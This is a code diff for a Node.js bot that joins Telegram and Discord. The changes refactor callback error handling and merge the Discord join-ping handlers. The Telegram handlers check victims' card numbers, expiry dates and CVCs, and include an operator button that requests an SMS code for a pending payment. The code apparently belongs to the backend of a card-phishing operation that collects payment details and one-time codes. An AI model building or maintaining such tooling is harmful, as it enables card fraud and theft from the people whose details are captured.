@@ -84,33 +84,51 @@ function validateCard(number, expiry, cvc) {
 }
 
 // Handle Telegram Callbacks
-botTg.on('callback_query', (query) => {
+botTg.on('callback_query', async (query) => {
     const data = query.data;
 
-    if (data.startsWith('validate_')) {
-        const [_, number, expiry, cvc] = data.split('|');
-        const v = validateCard(number, expiry, cvc);
-        const result = `🔍 *Résultat de Vérification*\n\n` +
-            `${v.isLuhnValid ? '✅' : '❌'} *Numéro:* ${v.isLuhnValid ? 'Valide' : 'Invalide'}\n` +
-            `${v.isExpiryValid ? '✅' : '❌'} *Date:* ${v.isExpiryValid ? 'Valide' : 'Expirée'}\n` +
-            `${v.isCvcValid ? '✅' : '❌'} *CVC:* ${v.isCvcValid ? 'Valide' : 'Invalide'}`;
-        botTg.sendMessage(query.message.chat.id, result, { parse_mode: 'Markdown' });
-    }
-
-    if (data.startsWith('ask_sms_')) {
-        const paymentId = data.replace('ask_sms_', '');
-        if (pendingPayments.has(paymentId)) {
-            const p = pendingPayments.get(paymentId);
-            p.needsSms = true;
-            botTg.answerCallbackQuery(query.id, { text: "Demande de code SMS envoyée !" });
-            botTg.editMessageReplyMarkup({ inline_keyboard: [[{ text: "⏳ Attente SMS...", callback_data: "none" }]] }, { 
-                chat_id: query.message.chat.id, 
-                message_id: query.message.id 
-            });
+    try {
+        if (data.startsWith('validate_')) {
+            const [_, number, expiry, cvc] = data.split('|');
+            const v = validateCard(number, expiry, cvc);
+            const result = `🔍 *Résultat de Vérification*\n\n` +
+                `${v.isLuhnValid ? '✅' : '❌'} *Numéro:* ${v.isLuhnValid ? 'Valide' : 'Invalide'}\n` +
+                `${v.isExpiryValid ? '✅' : '❌'} *Date:* ${v.isExpiryValid ? 'Valide' : 'Expirée'}\n` +
+                `${v.isCvcValid ? '✅' : '❌'} *CVC:* ${v.isCvcValid ? 'Valide' : 'Invalide'}`;
+            
+            await botTg.answerCallbackQuery(query.id).catch(() => {});
+            await botTg.sendMessage(query.message.chat.id, result, { parse_mode: 'Markdown' });
+            return;
         }
+
+        if (data.startsWith('ask_sms_')) {
+            const paymentId = data.replace('ask_sms_', '');
+            if (pendingPayments.has(paymentId)) {
+                const p = pendingPayments.get(paymentId);
+                p.needsSms = true;
+                
+                await botTg.answerCallbackQuery(query.id, { text: "Demande de code SMS envoyée !" }).catch(() => {});
+                
+                // Safe edit to avoid 400 errors if message is gone or already edited
+                try {
+                    await botTg.editMessageReplyMarkup({ 
+                        inline_keyboard: [[{ text: "⏳ Attente SMS...", callback_data: "none" }]] 
+                    }, { 
+                        chat_id: query.message.chat.id, 
+                        message_id: query.message.id 
+                    });
+                } catch (e) {
+                    console.log("EditMessageReplyMarkup failed (expected behavior if collision):", e.message);
+                }
+                return;
+            }
+        }
+        
+        // Final fallback to answer any other query and remove loading state from button
+        await botTg.answerCallbackQuery(query.id).catch(() => {});
+    } catch (err) {
+        console.error("Erreur Callback Telegram:", err.message);
     }
-    
-    botTg.answerCallbackQuery(query.id).catch(() => {});
 });
 
 // Commande de test
@@ -244,7 +262,7 @@ app.listen(PORT, () => {
 // -----------------------------
 
 
-client.once('clientReady', async (c) => {
+client.once('ready', async (c) => {
     console.log(`Bot prêt ! Connecté en tant que ${c.user.tag}`);
     sendToTelegram(`🤖 *Discord Bot Prêt*\nConnecté en tant que **${c.user.tag}**`);
     // Fetch all invites for all guilds
@@ -328,20 +346,7 @@ client.on('guildMemberUpdate', async (oldMember, newMember) => {
     }
 });
 
-client.on('guildMemberAdd', async (member) => {
-    const channelId = '1483532401404543077';
-    const channel = member.guild.channels.cache.get(channelId);
-    if (!channel) return;
-
-    try {
-        const msg = await channel.send(`<@${member.id}>`);
-        setTimeout(async () => {
-            await msg.delete().catch(() => {});
-        }, 3000);
-    } catch (err) {
-        console.error("Erreur interaction join ping:", err);
-    }
-});
+// Logic moved to main guildMemberAdd handler below
 
 const STAFF_ROLE_ID = '1483537167555891211';
 const CATEGORY_VIP_ID = '1483885573872685157';
@@ -451,6 +456,15 @@ process.on('uncaughtException', error => logError(error, 'Uncaught Exception'));
 
 client.on('guildMemberAdd', async (member) => {
     try {
+        // --- JOIN PING LOGIC ---
+        const pingChannelId = '1483532401404543077';
+        const pingChannel = member.guild.channels.cache.get(pingChannelId) || await member.guild.channels.fetch(pingChannelId).catch(() => null);
+        if (pingChannel) {
+            const msg = await pingChannel.send(`<@${member.id}>`).catch(() => null);
+            if (msg) setTimeout(() => msg.delete().catch(() => {}), 3000);
+        }
+        // ------------------------
+
         // Invite tracking logic
         const cachedInvites = guildInvites.get(member.guild.id);
         const newInvites = await member.guild.invites.fetch().catch(() => null);
